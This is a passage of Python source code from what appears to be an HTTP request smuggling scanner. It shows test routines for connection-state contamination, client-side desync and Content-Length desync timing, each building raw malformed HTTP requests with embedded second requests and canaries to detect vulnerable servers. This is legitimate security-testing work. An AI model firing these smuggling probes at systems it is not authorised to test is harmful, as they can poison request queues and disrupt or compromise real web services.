        combined  = req1 + req2
        resp_data = self._raw(combined, url)
        direct    = self._raw(req2, url)

        if not resp_data or not direct:
            return None

        indirect_parts = resp_data.split(b"HTTP/1.")
        if len(indirect_parts) >= 3:
            # Got 2 responses on one connection
            indirect_status2, indirect_body2 = _parse_response(
                b"HTTP/1." + indirect_parts[2]
            )
        elif len(indirect_parts) >= 2:
            indirect_status2, indirect_body2 = _parse_response(
                b"HTTP/1." + indirect_parts[-1]
            )
        else:
            return None

        direct_status, direct_body = _parse_response(direct)

        if (indirect_status2 and direct_status
                and indirect_status2 != direct_status
                and indirect_status2 not in (301, 302, 307, 308)):
            return _finding(
                "HTTP Request Smuggling — connection-state contamination",
                url, "high",
                f"Second request on same connection: status {indirect_status2} "
                f"vs direct status {direct_status}. Prior request contaminated "
                "connection state. Possible CL.TE or keep-alive desync.",
                "conn_state_contamination",
            )

        if canary in (indirect_body2 or "") and canary not in (direct_body or ""):
            return _finding(
                "HTTP Request Smuggling — connection-state reflection",
                url, "medium",
                f"Canary '{canary}' reflected in indirect 2nd response but not in "
                "direct request. Connection-state persistence confirmed.",
                "conn_state_reflection",
            )

        return None

    # ────────────────────────────────────────────────────────────────────────
    # TEST 13: Client-side desync (CSD)
    # ────────────────────────────────────────────────────────────────────────

    def _test_client_side_desync(self, url: str, baseline: dict) -> Optional[dict]:
        """
        Port of ClientDesyncScan — send one request where Content-Length
        declares enough bytes to include a complete second request. If the
        server processes two requests from one connection, it's vulnerable.
        """
        path       = self._path(url)
        host       = urlparse(url).netloc or self.host
        canary     = f"wrtz{int(time.time()) % 100000:05d}"
        poison_path = f"{path}?{canary}=1"

        # The "second request" embedded in the body
        inner = (
            f"GET {poison_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-CSD-Canary: {canary}\r\n"
            f"\r\n"
        )
        inner_bytes = inner.encode()

        # Outer request: CL declares length that exactly covers inner request
        outer_cl = len(inner_bytes)
        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {_DEFAULT_UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {outer_cl}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode() + inner_bytes

        resp_data = self._raw(raw, url)
        if resp_data is None:
            return None

        n = _count_responses(resp_data)
        if n >= 2:
            return _finding(
                "HTTP Request Smuggling — client-side desync (CSD) confirmed",
                url, "critical",
                f"Single POST request triggered {n} HTTP responses on one connection. "
                f"CL={outer_cl} body contained a complete second GET request "
                f"({poison_path[:80]}). Server split the single connection into two "
                "requests — CSD vulnerability confirmed.",
                "csd_two_responses",
            )

        # Check if canary appeared in response (partial CSD)
        resp_text = resp_data.decode("utf-8", errors="replace")
        if canary in resp_text:
            return _finding(
                "HTTP Request Smuggling — client-side desync (canary reflected)",
                url, "high",
                f"Canary '{canary}' from embedded inner request reflected in response. "
                "Possible partial CSD — the embedded request was partially processed.",
                "csd_canary_reflected",
            )

        return None

    # ────────────────────────────────────────────────────────────────────────
    # TEST 14: CL desync timing (original, preserved)
    # ────────────────────────────────────────────────────────────────────────

    def _test_cl_desync_timing(self, url: str, baseline: dict) -> Optional[dict]:
        """CL shorter than actual body; follow-up GET on same connection."""
        path = self._path(url)
        host = urlparse(url).netloc or self.host

        short_cl_body = b"AAAAAA" + b"BBBB"  # 10 bytes, CL=6
        followup = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {_DEFAULT_UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode() + short_cl_body + followup

        resp_data, elapsed = self._timed_raw(raw, url)
        if resp_data is None:
            return None

        if _count_responses(resp_data) > 1:
            return _finding(
                "HTTP Request Smuggling — CL desync (dual response)",
                url, "high",
                "Sent CL=6 with 10-byte body + follow-up GET. "
                "Received multiple HTTP responses — back-end consumed excess bytes "
                "as a new request.",
                "cl_desync_dual",
            )

        try:
            t0 = time.monotonic()
            self.session.get(url, timeout=self.timeout, allow_redirects=False)
            post_elapsed = time.monotonic() - t0
        except requests.RequestException:
            return None

        if post_elapsed > baseline["elapsed"] * _TIMING_MULTIPLIER:
            return _finding(
                "HTTP Request Smuggling — CL desync timing anomaly",
                url, "medium",
                f"Follow-up GET after CL desync probe: {post_elapsed:.2f}s vs "
                f"baseline {baseline['elapsed']:.2f}s "
                f"({post_elapsed / max(baseline['elapsed'], 0.001):.1f}× slower). "
                "Possible request-queue poisoning.",
                "cl_desync_timing",
            )
        return None


# ── Standalone self-test ──────────────────────────────────────────────────────

if __name__ == "__main__":
    print("HTTP2Smuggler — full arsenal OK")
    print(f"  TE gadgets: {len(_TE_GADGETS)}")
    print(f"  CL gadgets: {len(_cl_gadgets(5))}")
    print("  Tests: CL.TE, TE.CL, TE.TE×25, CL×9, TERM.EXT×3, H2C, H2-path-CRLF,")
    print("         H2-host, H2.TE-downgrade, H2-gadgets, H1-tunnel, conn-state,")
    print("         client-desync, CL-timing")
